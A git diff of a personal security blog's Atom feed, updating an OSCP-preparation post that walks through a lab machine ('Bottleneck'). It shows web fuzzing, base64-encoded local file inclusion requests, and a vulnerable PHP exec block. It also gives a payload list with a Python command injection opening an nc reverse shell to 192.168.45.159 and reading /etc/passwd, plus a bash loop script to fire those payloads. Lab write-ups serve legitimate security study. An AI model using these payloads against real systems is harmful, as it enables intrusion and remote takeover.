@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-03-09T22:41:02+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Zwerd</title><subtitle>A stunning blog of freaking Cyber warrior</subtitle><author><name>Guy Zwerdling</name></author><entry><title type="html">The Full Methodology for OSCP Passing.</title><link href="http://localhost:4000/2024/02/18/oscp_path.html" rel="alternate" type="text/html" title="The Full Methodology for OSCP Passing." /><published>2024-02-18T00:00:00+02:00</published><updated>2024-02-18T00:00:00+02:00</updated><id>http://localhost:4000/2024/02/18/oscp_path</id><content type="html" xml:base="http://localhost:4000/2024/02/18/oscp_path.html">&lt;p&gt;Lately, I’ve been thinking a lot about some job interviews I had recently, especially one at a really good organization near to my aria. The interviews were interesting and kind of tough, and they got me thinking about my work and where I’m headed.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-03-17T17:56:04+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Zwerd</title><subtitle>A stunning blog of freaking Cyber warrior</subtitle><author><name>Guy Zwerdling</name></author><entry><title type="html">The Full Methodology for OSCP Passing.</title><link href="http://localhost:4000/2024/02/18/oscp_path.html" rel="alternate" type="text/html" title="The Full Methodology for OSCP Passing." /><published>2024-02-18T00:00:00+02:00</published><updated>2024-02-18T00:00:00+02:00</updated><id>http://localhost:4000/2024/02/18/oscp_path</id><content type="html" xml:base="http://localhost:4000/2024/02/18/oscp_path.html">&lt;p&gt;Lately, I’ve been thinking a lot about some job interviews I had recently, especially one at a really good organization near to my aria. The interviews were interesting and kind of tough, and they got me thinking about my work and where I’m headed.&lt;/p&gt;
 
 &lt;p&gt;The first interview was on Zoom and was all about technical stuff. They asked me about Wireshark, which is a tool for analyzing network traffic, and about different protocols like TCP, LDAP, and SMB2. They also asked about things like Linux processes and sockets, which are like communication channels between computers. It was a good chat, and I felt like I could talk to them easily. They even explained what comes next in their hiring process.&lt;/p&gt;
 
@@ -637,173 +637,105 @@ root@debian:/home/hadi#
     &lt;p&gt;Enumeration: run &lt;code class=&quot;highlighter-rouge&quot;&gt;rustscan&lt;/code&gt; and found two ports 22,80, so run nmap against them, found that ssh is on version 7.9p1, the web contain the title BOTTLENECK, so going to enumerate it more with web fuzzing tool.&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;Web Fuzzing: run &lt;code class=&quot;highlighter-rouge&quot;&gt;webenum&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;feroxbuster&lt;/code&gt; found nothing, but still we have no other service we must continue and enumerate the target with web fuzzing tool. run &lt;code class=&quot;highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; against the target with the dirb wordlist found the following:
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.170.22/FUZZ -e .php
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.166.22/FUZZ -e .php
 ...
 image_gallery.php       [Status: 200, Size: 6381, Words: 1626, Lines: 169, Duration: 371ms]
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-    &lt;p&gt;going to that url over the browser and run F12 found that this page give us back parameters to include on the URL it self, the first one is t and the second is f:&lt;/p&gt;
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.170.22/image_gallery.php?t=1709652216&amp;amp;f=Ym90dGxlbmVja19kb250YmUucG5n
+    &lt;p&gt;Or we can also use wfuzz, since we know that there is index.php page which is the default landing page we can enumerate only for php pages.&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz -w /usr/share/wordlists/dirb/big.txt -u  &quot;http://192.168.166.22/FUZZ.php&quot; --hc 404
+...
+000009353:   200        168 L    348 W      6381 Ch     &quot;image_gallery&quot;
+000009563:   200        272 L    729 W      10175 Ch    &quot;index&quot;  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Then going to that URL over the browser and run F12 found that this page give us back parameters to include on the URL it self, the first one is t and the second is f:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.166.22/image_gallery.php?t=1709652216&amp;amp;f=Ym90dGxlbmVja19kb250YmUucG5n
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;Web Assessment: The f value look like short for file, so run &lt;code class=&quot;highlighter-rouge&quot;&gt;└─$ echo &quot;Ym90dGxlbmVja19kb250YmUucG5n&quot; | base64 -d&lt;/code&gt; give us back the value &lt;code class=&quot;highlighter-rouge&quot;&gt;bottleneck_dontbe.png&lt;/code&gt;, this may mean that this url can be use for local file inclusion (LFI), but for the t value it look like time, so search on google found that &lt;code class=&quot;highlighter-rouge&quot;&gt;date +%s&lt;/code&gt; give us back the current time. So running burpsuite and the following query for trying get back the php code itself and understand what going on in that page.
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;proxychains4 curl &quot;http://192.168.166.22/image_gallery.php?t=$(date +%s)&amp;amp;f=$(echo -n ''../../../../../../www/html/image_gallery.php'|base64)&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;The output for that one query is the following:
+&lt;img src=&quot;/assets/images/op-001.png&quot; alt=&quot;op-001.png&quot; /&gt;.
+This is not the output we expected to see so play with the query a bit found the correct way to get the php file back.&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;proxychains4 curl &quot;http://192.168.166.22/image_gallery.php?t=$(date +%s)&amp;amp;f=$(echo -n '../../../www/html/image_gallery.php'|base64)&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;/assets/images/op-002.png&quot; alt=&quot;op-002.png&quot; /&gt;
+As you can see, we successfully include local file from the save in such way that we can see the original code.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Code Review: Since we can see that it use &lt;code class=&quot;highlighter-rouge&quot;&gt;image_gallery_load.php&lt;/code&gt;, we can trying to get that file also and see the original php code that should be used for LFI misconfiguration:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;proxychains4 curl &quot;http://192.168.166.22/image_gallery.php?t=$(date +%s)&amp;amp;f=$(echo -n '../../../www/html/image_gallery_load.php'|base64)&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;The output contains several lines of php code, so what we need to do is to review the original code and look at it’s structure, the block of code that looks interesting is the following:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if($isblocked){
+ $logfile = 'intrusion_'.$timestamp;
+ $fp = fopen('/var/log/soc/'.$logfile, 'w');
+ fwrite($fp, &quot;'&quot;.$imagefile.&quot;'&quot;); &amp;lt;----------------------
+ fclose($fp);
+ exec('python /opt/ids_strong_bvb.py &amp;lt;/var/log/soc/'.$logfile.' &amp;gt;/tmp/output 2&amp;gt;&amp;amp;1');
+ print_troll();
+ exit();
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;That block code contain the &lt;code class=&quot;highlighter-rouge&quot;&gt;$imagefile&lt;/code&gt; that came from our query &lt;code class=&quot;highlighter-rouge&quot;&gt;$imagefile = base64_decode($_GET['f']);&lt;/code&gt; at the beginning of the code, that image file contain the string of the image in base64, if the inserted value is decoded as &lt;code class=&quot;highlighter-rouge&quot;&gt;etc&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;dev&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;usr&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;home&lt;/code&gt;, then it should block by another function that came above that section, then after it block the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;$logfile&lt;/code&gt; contain the timestamp, the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;$fp&lt;/code&gt; are used for open the &lt;code class=&quot;highlighter-rouge&quot;&gt;logfile&lt;/code&gt; and write back to it the &lt;code class=&quot;highlighter-rouge&quot;&gt;$imagefile&lt;/code&gt; value, then it run some python code named &lt;code class=&quot;highlighter-rouge&quot;&gt;ids_strong_bvb.py&lt;/code&gt; which get the &lt;code class=&quot;highlighter-rouge&quot;&gt;$logfile&lt;/code&gt; back and redirect the output to &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/output&lt;/code&gt; file. this is mean that we should be able to inject code by adding some value like &lt;code class=&quot;highlighter-rouge&quot;&gt;etc&lt;/code&gt; to the &lt;code class=&quot;highlighter-rouge&quot;&gt;f=&lt;/code&gt; value on the url (base64), then it should block that one since it is &lt;code class=&quot;highlighter-rouge&quot;&gt;etc&lt;/code&gt; and pass the inject code to the &lt;code class=&quot;highlighter-rouge&quot;&gt;$logfile&lt;/code&gt; which use later with that python code. If we succeeded the &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/output&lt;/code&gt; should contain the output from the injected command.
+In my case I have used the following bash code, that should execute each code in the payload.txt. My payload is:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;../etc/passwd
+../etc/passwd' and __import__('os').system(&quot;uname -a&quot;) and '
+../../../../../tmp/output
+../../../../tmp/output
+../etc/passwd' and __import__('os').system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.45.159 443 &amp;gt;/tmp/f&quot;) and '
+../../../../../tmp/output
+../../../../tmp/output
+../../../tmp/output
+../../tmp/output
+../tmp/output
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Please note that this payload is python based since the &lt;code class=&quot;highlighter-rouge&quot;&gt;ids_strong_bvb.py&lt;/code&gt; should execute it. My original bash code is as follow
 ```
-proxychains4 curl “http://192.168.170.22/image_gallery.php?t=$(date +%s)&amp;amp;f=$(echo -n “../../../../../../www/html/image_gallery.php”|base64)”
-[proxychains] config file found: /etc/proxychains4.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.16
-[proxychains] Dynamic chain  …  127.0.0.1:8080  …  192.168.170.22:80  …  OK&lt;/li&gt;
+#!/bin/bash
+url=$1
+wordlist=$2
+loop=0
+[ $# != 2 ] &amp;amp;&amp;amp; { echo “Usage: $0 url wordlist”; exit 1; }
+checksum=”d41d8cd98f00b204e9800998ecf8427e”&lt;/p&gt;
+  &lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;p&gt;Let me throw away your nice request into the bin.
-The SOC was informed about your attempt to break into this site. Thanks to previous attackers effort in smashing my infrastructructure I will take strong legal measures.
-Why don’t you wait on your chair until someone (maybe the police) knock on your door?&lt;/p&gt;
+&lt;p&gt;while read file;
+do
+	loop=&lt;code class=&quot;highlighter-rouge&quot;&gt;expr $loop + 1&lt;/code&gt;
+	echo “[+] Loop number: $loop”
+	echo “[+] Test file: $file”
+	echo “[+] GET reqest: $url?t=$(date +%s)&amp;amp;f=$(echo -n “$file”| base64 -w 0)”
+	echo “[+] Script run: python /opt/ids_strong_bvb.py &amp;lt;/var/log/soc/’.$file.’ &amp;gt;/tmp/output 2&amp;gt;&amp;amp;1”;
+	echo “[+] Base64: $(echo -n $file| base64 -w 0)”
+	curl -s “$url?t=$(date +%s)&amp;amp;f=$(echo -n “$file”| base64 -w 0)” -o “$loop.txt”;
+	echo “————-time: $(date +%s) ———”
+	echo “————read-file-$loop————”
+	cat ./”$loop.txt”&lt;/p&gt;
 
-&lt;pre&gt;
-                                   _,..._
-                                  /__    \
-                                   &amp;gt;&amp;lt; `.  \
-                                  /_    \ |
-                                   \-_  /:|
-                                 ,--'..'. :
-                               ,'         `.
-                            _,'             \
-                   _.._,--''    ,           |
-               , ,',, _|    _,.'|      |    |
-            \||/,'(,' '--''    |      |    |
-       _     |||                |      /-'  |
-      | |   (- -)&amp;lt;`._           |     /    /
-      | |  \_\O/_/`-.(&amp;lt;&amp;lt;        |____/    /
-      | |   /   \              / -'| `--.'|
-      | |   \___/             /           /
-      | |    H H             /     |     |
-      |_|_..-H-H--.._       /     ,|     |
-        |-.._&quot;_&quot;__..-|     |   _-/ |     |
-        |            |     |    |   \_   |
-        |            |     |    |   |    |
-        |            |     |____|   |    |
-        |            |  _..'    |   |____|
-        |            |_(____..._' _.'    |
-        `-..______..-'&quot;&quot;         (___..--'
-&lt;pre&gt;
-```
-This is not the output we expected to see so play with the query a bit found the correct way to get the php file back.
-```
-proxychains4 curl &quot;http://192.168.170.22/image_gallery.php?t=$(date +%s)&amp;amp;f=$(echo -n &quot;../../../www/html/image_gallery.php&quot;|base64)&quot;
-...
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;filesum=$(cat &quot;$loop.txt&quot; | md5sum|awk '{print $1}')
+if [[ &quot;$checksum&quot; == &quot;$filesum&quot; ]];
+then
+	echo &quot;[+] Found new file: $loop.txt&quot;
+	echo &quot;[+] URL: $url?t=$(date +%s)&amp;amp;f=$(echo -n $file| base64)&quot;
+	cat $loop.txt
+	break
+fi done &amp;lt; $wordlist ``` You can see that my code do some checksum with the falue `d41d8cd98f00b204e9800998ecf8427e` which is the value of empty file. Then run it with the following command. ``` ./lfi_base.sh http://192.168.166.22/image_gallery.php ./payload.txt ``` Also please note that I have been test it may times before I got it to work, this is really hard machine I think that requires a lot of concentration and understanding of code, in this case PHP.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-$tstamp = time();
-if(isset($_GET['t']) &amp;amp;&amp;amp; isset($_GET['f'])){
-    include_once 'image_gallery_load.php';
-    exit();
-}
+&lt;ol&gt;
+  &lt;li&gt;Initiation: so now after we have all set we can execute the code and on another terminal open listener for port 443.
+&lt;img src=&quot;/assets/images/op-003.gif&quot; alt=&quot;op-003.gif&quot; /&gt;&lt;/li&gt;
+&lt;/ol&gt;
 
-?&amp;gt;
-&amp;lt;!DOCTYPE html&amp;gt;
-```
+&lt;h3 id=&quot;bottleneck-1&quot;&gt;Bottleneck&lt;/h3&gt;
 
-4. Code Review: Since we can see that it use `image_gallery_load.php`, we can trying to get that file also and see the php code that should be used for LFI misconfiguration:
-```
-proxychains4 curl &quot;http://192.168.170.22/image_gallery.php?t=$(date +%s)&amp;amp;f=$(echo -n &quot;../../../www/html/image_gallery_load.php&quot;|base64)&quot;
-...
-&lt;?php
-function print_troll(){
-    $messages = $GLOBALS['messages'];
-    $troll = $GLOBALS['troll'];
-    echo $messages[0];
-    echo $troll;
-}
+&lt;h3 id=&quot;brokengallery&quot;&gt;BrokenGallery&lt;/h3&gt;
 
-$troll = &lt;&lt;&lt;EOT
-&lt;pre&gt;
-                                   _,..._
-                                  /__    \
-                                   &gt;&lt; `.  \
-                                  /_    \ |
-                                   \-_  /:|
-...
-if(!isset($_GET['t']) || !isset($_GET['f'])){
-    exit();
-}
+&lt;h3 id=&quot;dawn2&quot;&gt;Dawn2&lt;/h3&gt;
 
-$imagefile = base64_decode($_GET['f']);
-$timestamp = time();
-$isblocked = FALSE;
-$blacklist = array('/etc','/opt','/var','/opt','/proc','/dev','/lib','/bin','/usr','/home','/ids');
-$messages = array(&quot;\nLet me throw away your nice request into the bin.\n&quot;.
-    &quot;The SOC was informed about your attempt to break into this site. Thanks to previous attackers effort in smashing my infrastructructure I will take strong legal measures.\n&quot;.
-    &quot;Why don't you wait on your chair until someone (maybe the police) knock on your door?\n\n&quot;);
+&lt;h3 id=&quot;dawn3&quot;&gt;Dawn3&lt;/h3&gt;
 
-if(abs($_GET['t'] - $timestamp) &gt; 10){
-    exit();
-}
-foreach($blacklist as $elem){
-    if(strstr($imagefile, $elem) !== FALSE)
-        $isblocked = TRUE;
-}
-// report the intrusion to the soc and save information locally for further investigation
-if($isblocked){
-    $logfile = 'intrusion_'.$timestamp;
-    $fp = fopen('/var/log/soc/'.$logfile, 'w');
-    fwrite($fp, &quot;'&quot;.$imagefile.&quot;'&quot;);
-    fclose($fp);
-    exec('python /opt/ids_strong_bvb.py &lt;/var/log/soc/'.$logfile.' &gt;/tmp/output 2&gt;&amp;1');
-    print_troll();
-    exit();
-}
-chdir('img');
-$filecontent = file_get_contents($imagefile);
-if($filecontent === FALSE){
-    print_troll();
-}
-else{
-    echo $filecontent;
-}
-chdir('../');
-
-?&gt;
-```
-The block of code that look interesting is the following:
-```
-if($isblocked){
-    $logfile = 'intrusion_'.$timestamp;
-    $fp = fopen('/var/log/soc/'.$logfile, 'w');
-    fwrite($fp, &quot;'&quot;.$imagefile.&quot;'&quot;); &amp;lt;----------------------
-    fclose($fp);
-    exec('python /opt/ids_strong_bvb.py &amp;lt;/var/log/soc/'.$logfile.' &amp;gt;/tmp/output 2&amp;gt;&amp;amp;1');
-    print_troll();
-    exit();
-```
-That block code contain the `$imagefile` that came from our query `$imagefile = base64_decode($_GET['f']);`
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-### Bottleneck
-
-### BrokenGallery
-
-### Dawn2
-
-### Dawn3
-
-#### Final table methodology
-&lt;/pre&gt;&lt;/pre&gt;</content><author><name>Guy Zwerdling</name></author><category term="Pentest" /><category term="OSCP" /><summary type="html">Lately, I've been thinking a lot about some job interviews I had recently, especially one at a really good company near me. The interviews were interesting and kind of tough, and they got me thinking about my work...</summary></entry><entry><title type="html">The First Path to Malware Research - Buffer Overflow Analysis.</title><link href="http://localhost:4000/2024/01/07/buffer_overflow_01.html" rel="alternate" type="text/html" title="The First Path to Malware Research - Buffer Overflow Analysis." /><published>2024-01-07T00:00:00+02:00</published><updated>2024-01-07T00:00:00+02:00</updated><id>http://localhost:4000/2024/01/07/buffer_overflow_01</id><content type="html" xml:base="http://localhost:4000/2024/01/07/buffer_overflow_01.html">&lt;p&gt;If you follow up my latest post, you can see that it’s being long time since I upload my latest post here, and you may know that I am working on and preparing to the &lt;strong&gt;OSCP&lt;/strong&gt; exam, which is the ultimate certification in my case. One of the attacks that I have learn on that path and exciting me much, so much so that it gives me chills, is &lt;strong&gt;buffer overflow&lt;/strong&gt; attack. I have seeing many attacks, from the application level to the low level, which is called also the infrastructure level, in my case I have found my self more enjoyable by learning buffer overflow, and after I finish my first attack on that low memory, I finally recognized what I really what to do on the cyber security field is to be cyber security researcher, which mean, among to the others, to know how to analysis malware and viruses, how to track their actions, and understand what they design to do, if you search about that on linkedin, you should find research type of jobs that include reverse engineering.&lt;/p&gt;
+&lt;h4 id=&quot;final-table-methodology-1&quot;&gt;Final table methodology&lt;/h4&gt;</content><author><name>Guy Zwerdling</name></author><category term="Pentest" /><category term="OSCP" /><summary type="html">Lately, I've been thinking a lot about some job interviews I had recently, especially one at a really good company near me. The interviews were interesting and kind of tough, and they got me thinking about my work...</summary></entry><entry><title type="html">The First Path to Malware Research - Buffer Overflow Analysis.</title><link href="http://localhost:4000/2024/01/07/buffer_overflow_01.html" rel="alternate" type="text/html" title="The First Path to Malware Research - Buffer Overflow Analysis." /><published>2024-01-07T00:00:00+02:00</published><updated>2024-01-07T00:00:00+02:00</updated><id>http://localhost:4000/2024/01/07/buffer_overflow_01</id><content type="html" xml:base="http://localhost:4000/2024/01/07/buffer_overflow_01.html">&lt;p&gt;If you follow up my latest post, you can see that it’s being long time since I upload my latest post here, and you may know that I am working on and preparing to the &lt;strong&gt;OSCP&lt;/strong&gt; exam, which is the ultimate certification in my case. One of the attacks that I have learn on that path and exciting me much, so much so that it gives me chills, is &lt;strong&gt;buffer overflow&lt;/strong&gt; attack. I have seeing many attacks, from the application level to the low level, which is called also the infrastructure level, in my case I have found my self more enjoyable by learning buffer overflow, and after I finish my first attack on that low memory, I finally recognized what I really what to do on the cyber security field is to be cyber security researcher, which mean, among to the others, to know how to analysis malware and viruses, how to track their actions, and understand what they design to do, if you search about that on linkedin, you should find research type of jobs that include reverse engineering.&lt;/p&gt;
 
 &lt;p&gt;If you ask my Mentor, Sagi Kedmi, about that, I am sure that he will be say “you need to be the developer yourself, let the other read you garbage logs”. I can say that I understand that, but after I develop my last two React-Native Apps, I was many time frustrated. On the other hand the path I have done until I have break my first program in low memory level, was so much fun and I learn a lot, so I guess that is better for me to go to that field, the malware researcher and reverse engineer.&lt;/p&gt;
 
